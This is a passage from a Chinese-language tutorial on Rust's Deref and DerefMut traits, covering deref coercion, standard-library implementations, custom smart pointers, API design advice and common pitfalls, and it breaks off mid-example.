    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"长度: {}"</span>, s.<span class="hljs-title function_ invoke__">len</span>());
}

<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">my_string</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">"hello"</span>);
<span class="hljs-title function_ invoke__">print_length</span>(&amp;my_string);  <span class="hljs-comment">// &amp;String 自动转为 &amp;str！</span>
</code></pre>
<p>为什么 <code>&amp;String</code> 能传给接受 <code>&amp;str</code> 的函数？因为 <code>String</code> 实现了 <code>Deref&lt;Target=str&gt;</code>：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">impl</span> <span class="hljs-title class_">Deref</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">String</span> {
    <span class="hljs-keyword">type</span> <span class="hljs-title class_">Target</span> = <span class="hljs-type">str</span>;
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">deref</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-type">str</span> {
        <span class="hljs-comment">// 返回内部字符串切片</span>
    }
}
</code></pre>
<p>当你写 <code>print_length(&amp;my_string)</code> 时，Rust 发现：</p>
<ul>
<li>你传的是 <code>&amp;String</code></li>
<li>函数要的是 <code>&amp;str</code></li>
<li><code>String</code> 实现了 <code>Deref&lt;Target=str&gt;</code></li>
</ul>
<p>于是 Rust 自动调用 <code>my_string.deref()</code>，把 <code>&amp;String</code> 转成 <code>&amp;str</code>。</p>
<p><strong>这才是 Deref 的核心价值</strong>：让你的 API 更灵活。你只需要写：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">process</span>(s: &amp;<span class="hljs-type">str</span>) { <span class="hljs-comment">/* ... */</span> }
</code></pre>
<p>调用者可以传：</p>
<ul>
<li><code>&amp;str</code> 字面量：<code>process("hello")</code></li>
<li><code>String</code>：<code>process(&amp;my_string)</code></li>
<li><code>Box&lt;str&gt;</code>：<code>process(&amp;boxed_str)</code></li>
<li><code>Rc&lt;String&gt;</code>：<code>process(&amp;rc_string)</code></li>
</ul>
<p>Rust 会自动帮你转换，不需要手动调用 <code>.as_str()</code> 或 <code>.deref()</code>。</p>
<h3 data-id="heading-3">DerefMut：可变版本</h3>
<p><code>DerefMut</code> 是 <code>Deref</code> 的可变版本，让你能修改智能指针里的值：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> std::ops::{Deref, DerefMut};

<span class="hljs-keyword">impl</span>&lt;T&gt; DerefMut <span class="hljs-keyword">for</span> <span class="hljs-title class_">MyBox</span>&lt;T&gt; {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">deref_mut</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-keyword">mut</span> T {
        &amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>.<span class="hljs-number">0</span>
    }
}

<span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">boxed</span> = <span class="hljs-title function_ invoke__">MyBox</span>(<span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">"hello"</span>));
boxed.<span class="hljs-title function_ invoke__">push_str</span>(<span class="hljs-string">" world"</span>);  <span class="hljs-comment">// 自动调用 deref_mut()，然后调用 String::push_str</span>
</code></pre>
<p><strong>规则</strong>：</p>
<ul>
<li>实现 <code>DerefMut</code> 必须先实现 <code>Deref</code></li>
<li><code>&amp;mut T</code> 可以自动转为 <code>&amp;mut U</code>（如果 <code>T: DerefMut&lt;Target=U&gt;</code>）</li>
<li><code>&amp;mut T</code> 也可以转为 <code>&amp;U</code>（可变引用可以降级为不可变引用）</li>
<li>但 <code>&amp;T</code> <strong>不能</strong>转为 <code>&amp;mut U</code>（不可变引用不能升级为可变引用）</li>
</ul>
<h3 data-id="heading-4">完整示例</h3>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> std::ops::{Deref, DerefMut};

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">MyBox</span>&lt;T&gt;(T);

<span class="hljs-keyword">impl</span>&lt;T&gt; Deref <span class="hljs-keyword">for</span> <span class="hljs-title class_">MyBox</span>&lt;T&gt; {
    <span class="hljs-keyword">type</span> <span class="hljs-title class_">Target</span> = T;
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">deref</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;T {
        &amp;<span class="hljs-keyword">self</span>.<span class="hljs-number">0</span>
    }
}

<span class="hljs-keyword">impl</span>&lt;T&gt; DerefMut <span class="hljs-keyword">for</span> <span class="hljs-title class_">MyBox</span>&lt;T&gt; {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">deref_mut</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-keyword">mut</span> T {
        &amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>.<span class="hljs-number">0</span>
    }
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">boxed</span> = <span class="hljs-title function_ invoke__">MyBox</span>(<span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">"hello"</span>));
    
    <span class="hljs-comment">// 使用 * 解引用</span>
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{}"</span>, *boxed);  <span class="hljs-comment">// 输出: hello</span>
    
    <span class="hljs-comment">// 自动调用 String 的方法（通过 deref）</span>
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"长度: {}"</span>, boxed.<span class="hljs-title function_ invoke__">len</span>());
    
    <span class="hljs-comment">// 自动调用 String 的可变方法（通过 deref_mut）</span>
    boxed.<span class="hljs-title function_ invoke__">push_str</span>(<span class="hljs-string">" world"</span>);
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{}"</span>, *boxed);  <span class="hljs-comment">// 输出: hello world</span>
}
</code></pre>
<h2 data-id="heading-5">2. 解引用强制转换（Deref Coercion）⭐</h2>
<blockquote>
<p><strong>💡 这是 Deref 最重要的特性！</strong> 如果只能记住一个知识点，就记住这个。</p>
</blockquote>
<p>这是 <code>Deref</code> 最强大的特性：Rust 会自动插入 <code>deref</code> 调用，让类型转换无缝进行。</p>
<h3 data-id="heading-6">自动转换规则</h3>
<p>当你传递 <code>&amp;T</code> 给期望 <code>&amp;U</code> 的函数时，如果 <code>T: Deref&lt;Target=U&gt;</code>，Rust 会自动转换：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">hello</span>(name: &amp;<span class="hljs-type">str</span>) {
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"Hello, {}"</span>, name);
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">s</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">"Rust"</span>);
    <span class="hljs-title function_ invoke__">hello</span>(&amp;s);  <span class="hljs-comment">// &amp;String 自动转换为 &amp;str</span>
    
    <span class="hljs-comment">// 等价于：</span>
    <span class="hljs-comment">// hello(s.deref());  // String 实现了 Deref&lt;Target=str&gt;</span>
}
</code></pre>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR
    A["&amp;String"] --&gt;|"自动调用 deref()"| B["&amp;str"]
    B --&gt; C["hello(&amp;str)"]
    
    style A fill:#e1f5ff
    style B fill:#fff4e1
    style C fill:#e8f5e9
</code></pre>
<h3 data-id="heading-7">多层解引用</h3>
<p>Rust 会递归调用 <code>deref</code>，直到找到匹配的类型：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> std::rc::Rc;

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">print_length</span>(s: &amp;<span class="hljs-type">str</span>) {
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"长度: {}"</span>, s.<span class="hljs-title function_ invoke__">len</span>());
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">s</span> = Rc::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">"hello"</span>));
    <span class="hljs-title function_ invoke__">print_length</span>(&amp;s);  <span class="hljs-comment">// &amp;Rc&lt;String&gt; -&gt; &amp;String -&gt; &amp;str</span>
}
</code></pre>
<pre><code class="hljs language-mermaid" lang="mermaid">flowchart LR
    A["&amp;Rc&amp;lt;String&amp;gt;"] --&gt;|"Rc::deref()"| B["&amp;String"]
    B --&gt;|"String::deref()"| C["&amp;str"]
    C --&gt; D["print_length(&amp;str)"]
    
    style A fill:#e1f5ff
    style B fill:#fff4e1
    style C fill:#ffe1f5
    style D fill:#e8f5e9
</code></pre>
<h3 data-id="heading-8">三种强制转换规则</h3>

























<table><thead><tr><th>从</th><th>到</th><th>条件</th></tr></thead><tbody><tr><td><code>&amp;T</code></td><td><code>&amp;U</code></td><td><code>T: Deref&lt;Target=U&gt;</code></td></tr><tr><td><code>&amp;mut T</code></td><td><code>&amp;mut U</code></td><td><code>T: DerefMut&lt;Target=U&gt;</code></td></tr><tr><td><code>&amp;mut T</code></td><td><code>&amp;U</code></td><td><code>T: Deref&lt;Target=U&gt;</code></td></tr></tbody></table>
<p>注意：<strong>不能</strong>从 <code>&amp;T</code> 转换为 <code>&amp;mut U</code>（违反借用规则）。</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">s</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">"hello"</span>);
    
    <span class="hljs-comment">// ✅ &amp;mut String -&gt; &amp;str（可变转不可变）</span>
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">r</span>: &amp;<span class="hljs-type">str</span> = &amp;<span class="hljs-keyword">mut</span> s;
    
    <span class="hljs-comment">// ❌ &amp;String -&gt; &amp;mut str（不可变转可变，编译错误）</span>
    <span class="hljs-comment">// let r: &amp;mut str = &amp;s;</span>
}
</code></pre>
<h2 data-id="heading-9">3. 标准库中的 Deref 实现</h2>
<h3 data-id="heading-10">String -&gt; str</h3>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">impl</span> <span class="hljs-title class_">Deref</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">String</span> {
    <span class="hljs-keyword">type</span> <span class="hljs-title class_">Target</span> = <span class="hljs-type">str</span>;
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">deref</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-type">str</span> {
        <span class="hljs-comment">// 返回内部字节切片的 str 引用</span>
    }
}
</code></pre>
<p>这让你能把 <code>&amp;String</code> 传给接受 <code>&amp;str</code> 的函数：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">count_chars</span>(s: &amp;<span class="hljs-type">str</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">usize</span> {
    s.<span class="hljs-title function_ invoke__">chars</span>().<span class="hljs-title function_ invoke__">count</span>()
}

<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">s</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">"你好"</span>);
<span class="hljs-title function_ invoke__">count_chars</span>(&amp;s);  <span class="hljs-comment">// &amp;String 自动转为 &amp;str</span>
</code></pre>
<h3 data-id="heading-11">Vec -&gt; [T]</h3>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">impl</span>&lt;T&gt; Deref <span class="hljs-keyword">for</span> <span class="hljs-title class_">Vec</span>&lt;T&gt; {
    <span class="hljs-keyword">type</span> <span class="hljs-title class_">Target</span> = [T];
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">deref</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;[T] {
        <span class="hljs-comment">// 返回内部数组的切片</span>
    }
}
</code></pre>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">sum</span>(slice: &amp;[<span class="hljs-type">i32</span>]) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">i32</span> {
    slice.<span class="hljs-title function_ invoke__">iter</span>().<span class="hljs-title function_ invoke__">sum</span>()
}

<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">v</span> = <span class="hljs-built_in">vec!</span>[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
<span class="hljs-title function_ invoke__">sum</span>(&amp;v);  <span class="hljs-comment">// &amp;Vec&lt;i32&gt; 自动转为 &amp;[i32]</span>
</code></pre>
<h3 data-id="heading-12">Box -&gt; T</h3>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">impl</span>&lt;T: ?<span class="hljs-built_in">Sized</span>&gt; Deref <span class="hljs-keyword">for</span> <span class="hljs-title class_">Box</span>&lt;T&gt; {
    <span class="hljs-keyword">type</span> <span class="hljs-title class_">Target</span> = T;
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">deref</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;T {
        <span class="hljs-comment">// 返回堆上值的引用</span>
    }
}
</code></pre>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">boxed</span> = <span class="hljs-type">Box</span>::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">"hello"</span>));
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">len</span> = boxed.<span class="hljs-title function_ invoke__">len</span>();  <span class="hljs-comment">// 直接调用 String 的方法</span>
</code></pre>
<h3 data-id="heading-13">Rc / Arc -&gt; T</h3>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> std::rc::Rc;

<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">shared</span> = Rc::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-built_in">vec!</span>[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>]);
<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">first</span> = shared[<span class="hljs-number">0</span>];  <span class="hljs-comment">// Rc&lt;Vec&lt;T&gt;&gt; 自动解引用为 Vec&lt;T&gt;</span>
</code></pre>
<h2 data-id="heading-14">4. 实现自己的智能指针</h2>
<p>核心就三步：</p>
<ol>
<li><strong>定义结构体</strong>：包装你要管理的数据</li>
<li><strong>实现 Deref</strong>：返回内部数据的引用</li>
<li><strong>实现 DerefMut</strong>（可选）：返回内部数据的可变引用</li>
</ol>
<h3 data-id="heading-15">最简单的例子</h3>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> std::ops::{Deref, DerefMut};

<span class="hljs-comment">// 1. 定义智能指针</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">MyBox</span>&lt;T&gt;(T);

<span class="hljs-comment">// 2. 实现 Deref</span>
<span class="hljs-keyword">impl</span>&lt;T&gt; Deref <span class="hljs-keyword">for</span> <span class="hljs-title class_">MyBox</span>&lt;T&gt; {
    <span class="hljs-keyword">type</span> <span class="hljs-title class_">Target</span> = T;  <span class="hljs-comment">// 解引用后得到什么类型</span>
    
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">deref</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;T {
        &amp;<span class="hljs-keyword">self</span>.<span class="hljs-number">0</span>  <span class="hljs-comment">// 返回内部值的引用</span>
    }
}

<span class="hljs-comment">// 3. 实现 DerefMut（如果需要修改）</span>
<span class="hljs-keyword">impl</span>&lt;T&gt; DerefMut <span class="hljs-keyword">for</span> <span class="hljs-title class_">MyBox</span>&lt;T&gt; {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">deref_mut</span>(&amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-keyword">mut</span> T {
        &amp;<span class="hljs-keyword">mut</span> <span class="hljs-keyword">self</span>.<span class="hljs-number">0</span>  <span class="hljs-comment">// 返回内部值的可变引用</span>
    }
}

<span class="hljs-comment">// 现在可以像普通值一样使用了！</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword">mut </span><span class="hljs-variable">boxed</span> = <span class="hljs-title function_ invoke__">MyBox</span>(<span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">"hello"</span>));
    
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{}"</span>, *boxed);  <span class="hljs-comment">// 解引用：hello</span>
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{}"</span>, boxed.<span class="hljs-title function_ invoke__">len</span>());  <span class="hljs-comment">// 自动调用 String::len()</span>
    
    boxed.<span class="hljs-title function_ invoke__">push_str</span>(<span class="hljs-string">" world"</span>);  <span class="hljs-comment">// 自动调用 String::push_str()</span>
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{}"</span>, *boxed);  <span class="hljs-comment">// hello world</span>
}
</code></pre>
<h3 data-id="heading-16">为什么要自己实现？</h3>
<p>实现 Deref 可以让你的类型：</p>
<ol>
<li><strong>像普通值一样使用</strong>：调用内部类型的方法</li>
<li><strong>自动类型转换</strong>：传给接受引用的函数</li>
<li><strong>添加额外功能</strong>：在不改变使用方式的前提下增强功能</li>
</ol>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> std::ops::Deref;

<span class="hljs-comment">// 例子：带日志的智能指针</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Logged</span>&lt;T&gt; {
    value: T,
    access_count: std::cell::Cell&lt;<span class="hljs-type">usize</span>&gt;,  <span class="hljs-comment">// 记录访问次数</span>
}

<span class="hljs-keyword">impl</span>&lt;T&gt; Logged&lt;T&gt; {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">new</span>(value: T) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-keyword">Self</span> {
        <span class="hljs-built_in">println!</span>(<span class="hljs-string">"创建 Logged 包装"</span>);
        Logged {
            value,
            access_count: std::cell::Cell::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-number">0</span>),
        }
    }
    
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">access_count</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> <span class="hljs-type">usize</span> {
        <span class="hljs-keyword">self</span>.access_count.<span class="hljs-title function_ invoke__">get</span>()
    }
}

<span class="hljs-keyword">impl</span>&lt;T&gt; Deref <span class="hljs-keyword">for</span> <span class="hljs-title class_">Logged</span>&lt;T&gt; {
    <span class="hljs-keyword">type</span> <span class="hljs-title class_">Target</span> = T;
    
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">deref</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;T {
        <span class="hljs-comment">// 每次访问都记录</span>
        <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">count</span> = <span class="hljs-keyword">self</span>.access_count.<span class="hljs-title function_ invoke__">get</span>();
        <span class="hljs-keyword">self</span>.access_count.<span class="hljs-title function_ invoke__">set</span>(count + <span class="hljs-number">1</span>);
        <span class="hljs-built_in">println!</span>(<span class="hljs-string">"访问第 {} 次"</span>, count + <span class="hljs-number">1</span>);
        &amp;<span class="hljs-keyword">self</span>.value
    }
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">logged</span> = Logged::<span class="hljs-title function_ invoke__">new</span>(<span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">"hello"</span>));
    
    <span class="hljs-comment">// 像普通 String 一样使用，但每次访问都有日志</span>
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"长度: {}"</span>, logged.<span class="hljs-title function_ invoke__">len</span>());  <span class="hljs-comment">// 访问第 1 次</span>
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"大写: {}"</span>, logged.<span class="hljs-title function_ invoke__">to_uppercase</span>());  <span class="hljs-comment">// 访问第 2 次</span>
    
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"总共访问了 {} 次"</span>, logged.<span class="hljs-title function_ invoke__">access_count</span>());
}
</code></pre>
<p><strong>关键点</strong>：通过 Deref，<code>Logged&lt;String&gt;</code> 可以像 <code>String</code> 一样调用 <code>.len()</code>、<code>.to_uppercase()</code> 等方法，同时还能记录访问次数。用户不需要写 <code>logged.value.len()</code>，代码更简洁。</p>
<p><strong>关键点</strong>：</p>
<ul>
<li><code>deref()</code> 必须返回引用，不能返回临时值</li>
<li>实现 <code>DerefMut</code> 必须先实现 <code>Deref</code></li>
<li>不要用 <code>Deref</code> 模拟继承，只用于智能指针</li>
</ul>
<h2 data-id="heading-17">5. 使用场景</h2>

























<table><thead><tr><th>场景</th><th>说明</th></tr></thead><tbody><tr><td>智能指针</td><td><code>Box</code>、<code>Rc</code>、<code>Arc</code> 等需要像普通引用一样使用</td></tr><tr><td>包装类型</td><td>为类型添加额外功能（如缓存、日志）但保持透明访问</td></tr><tr><td>类型转换</td><td><code>String</code> -&gt; <code>str</code>、<code>Vec&lt;T&gt;</code> -&gt; <code>[T]</code> 等自动转换</td></tr><tr><td>API 设计</td><td>让函数接受 <code>&amp;str</code> 而非 <code>&amp;String</code>，更灵活</td></tr></tbody></table>
<h3 data-id="heading-18">API 设计最佳实践</h3>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// ❌ 不好：强制调用者传 String</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">process_bad</span>(s: &amp;<span class="hljs-type">String</span>) {
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{}"</span>, s);
}

<span class="hljs-comment">// ✅ 好：接受 &amp;str，String 和 &amp;str 都能传</span>
<span class="hljs-keyword">fn</span> <span class="hljs-title function_">process_good</span>(s: &amp;<span class="hljs-type">str</span>) {
    <span class="hljs-built_in">println!</span>(<span class="hljs-string">"{}"</span>, s);
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">main</span>() {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">owned</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">"hello"</span>);
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">borrowed</span> = <span class="hljs-string">"world"</span>;
    
    <span class="hljs-comment">// process_bad(&amp;borrowed);  // 错误！&amp;str 不能转为 &amp;String</span>
    <span class="hljs-title function_ invoke__">process_bad</span>(&amp;owned);        <span class="hljs-comment">// 只能传 String</span>
    
    <span class="hljs-title function_ invoke__">process_good</span>(&amp;owned);       <span class="hljs-comment">// &amp;String 自动转为 &amp;str</span>
    <span class="hljs-title function_ invoke__">process_good</span>(borrowed);     <span class="hljs-comment">// &amp;str 直接传入</span>
}
</code></pre>
<p><strong>原则</strong>：函数参数优先用 <code>&amp;str</code>、<code>&amp;[T]</code> 等切片类型，而非 <code>&amp;String</code>、<code>&amp;Vec&lt;T&gt;</code>。</p>
<h2 data-id="heading-19">6. 常见陷阱</h2>
<h3 data-id="heading-20">陷阱 1：过度使用 Deref</h3>
<p><code>Deref</code> 不是继承！不要用它来模拟面向对象的继承关系。</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// ❌ 错误示例：用 Deref 模拟继承</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Employee</span> {
    name: <span class="hljs-type">String</span>,
}

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Manager</span> {
    employee: Employee,
    team_size: <span class="hljs-type">usize</span>,
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Deref</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Manager</span> {
    <span class="hljs-keyword">type</span> <span class="hljs-title class_">Target</span> = Employee;
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">deref</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;Employee {
        &amp;<span class="hljs-keyword">self</span>.employee
    }
}

<span class="hljs-comment">// 这不是继承！Manager 不是 Employee 的子类</span>
</code></pre>
<p><strong>正确做法</strong>：用组合（composition）或 trait。</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">trait</span> <span class="hljs-title class_">Person</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">name</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-type">str</span>;
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Employee</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">name</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-type">str</span> {
        &amp;<span class="hljs-keyword">self</span>.name
    }
}

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Person</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Manager</span> {
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">name</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-type">str</span> {
        &amp;<span class="hljs-keyword">self</span>.employee.name
    }
}
</code></pre>
<h3 data-id="heading-21">陷阱 2：Deref 返回临时值</h3>
<p><code>deref</code> 必须返回引用，不能返回临时值：</p>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Wrapper</span>(<span class="hljs-type">i32</span>);

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Deref</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Wrapper</span> {
    <span class="hljs-keyword">type</span> <span class="hljs-title class_">Target</span> = <span class="hljs-type">i32</span>;
    
    <span class="hljs-keyword">fn</span> <span class="hljs-title function_">deref</span>(&amp;<span class="hljs-keyword">self</span>) <span class="hljs-punctuation">-&gt;</span> &amp;<span class="hljs-type">i32</span> {
        <span class="hljs-comment">// ❌ 错误！返回临时值的引用</span>
        <span class="hljs-comment">// &amp;(self.0 + 1)  // 临时值在函数结束时销毁</span>
        
        <span class="hljs-comment">// ✅ 正确：返回字段的引用</span>
        &amp;<span class="hljs-keyword">self</span>.<span class="hljs-number">0</span>
    }
}
</code></pre>
<h3 data-id="heading-22">陷阱 3：混淆 Deref 和 AsRef</h3>




















<table><thead><tr><th>Trait</th><th>用途</th><th>自动转换</th></tr></thead><tbody><tr><td><code>Deref</code></td><td>智能指针行为</td><td>是（函数参数、方法调用）</td></tr><tr><td><code>AsRef</code></td><td>廉价引用转换</td><td>否（需要显式调用 <code>.as_ref()</code>）</td></tr></tbody></table>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">fn</span> <span class="hljs-title function_">with_deref</span>(s: &amp;<span class="hljs-type">str</span>) {
    <span class="hljs-comment">// &amp;String 自动转换</span>
}

<span class="hljs-keyword">fn</span> <span class="hljs-title function_">with_asref</span>&lt;T: <span class="hljs-built_in">AsRef</span>&lt;<span class="hljs-type">str</span>&gt;&gt;(s: T) {
    <span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">s_ref</span>: &amp;<span class="hljs-type">str</span> = s.<span class="hljs-title function_ invoke__">as_ref</span>();  <span class="hljs-comment">// 需要显式调用</span>
}

<span class="hljs-keyword">let</span> <span class="hljs-keyword"/><span class="hljs-variable">s</span> = <span class="hljs-type">String</span>::<span class="hljs-title function_ invoke__">from</span>(<span class="hljs-string">"hello"</span>);
<span class="hljs-title function_ invoke__">with_deref</span>(&amp;s);      <span class="hljs-comment">// 自动转换</span>
<span class="hljs-title function_ invoke__">with_asref</span>(&amp;s);      <span class="hljs-comment">// 泛型约束，内部需要 as_ref()</span>
</code></pre>
<p><strong>选择建议</strong>：</p>
<ul>
<li>智能指针用 <code>Deref</code></li>
<li>泛型函数接受多种类型用 <code>AsRef</code></li>
</ul>
<h3 data-id="heading-23">陷阱 4：DerefMut 的借用冲突</h3>
<pre><code class="hljs language-rust" lang="rust"><span class="hljs-keyword">use</span> std::ops::{Deref, DerefMut};

<span class="hljs-keyword">struct</span> <span class="hljs-title class_">Wrapper</span>(<span class="hljs-type">String</span>);

<span class="hljs-keyword">impl</span> <span class="hljs-title class_">Deref</span> <span class="hljs-keyword">for</span> <span class="hljs-title class_">Wrapper</span> {
